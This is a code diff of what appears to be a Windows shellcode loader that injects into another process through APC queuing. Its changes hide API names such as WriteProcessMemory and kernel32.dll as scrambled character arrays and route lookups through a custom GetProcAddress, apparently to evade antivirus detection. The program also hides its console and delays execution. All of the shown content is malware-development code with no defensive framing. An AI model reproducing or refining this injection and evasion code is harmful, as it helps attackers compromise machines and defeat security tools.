@@ -60,6 +60,8 @@ unsigned char NWVR[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 
 unsigned char HvqNFK[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
 unsigned char sQKsNqz[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
 unsigned char UHVQNq[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };
+unsigned char QGHdqE[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+unsigned char VSaMk[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
 
 static NTSTATUS(__stdcall* NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) =
     (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))myGetProcAddress(GetModuleHandle(HvqNFK), sQKsNqz);
@@ -123,7 +125,7 @@ int main() {
 
     FreeConsole();
 
-    Random6 Random7 = (Random6)(GetProcAddress(GetModuleHandleA(HvqNFK), (LPCSTR)sNtA));
+    Random6 Random7 = (Random6)(myGetProcAddress(GetModuleHandleA(HvqNFK), (LPCSTR)sNtA));
 
     SIZE_T Random4 = sizeof(Random3);
 
@@ -137,7 +139,7 @@ int main() {
     Sleep(3000); // Corrected Sleep function name
 
     WriteProcessMemoryPtr pWriteProcessMemory =
-reinterpret_cast<WriteProcessMemoryPtr>(myGetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory"));
+reinterpret_cast<WriteProcessMemoryPtr>(myGetProcAddress(GetModuleHandleA(QGHdqE), VSaMk));
 
 
 if (pWriteProcessMemory != nullptr) {
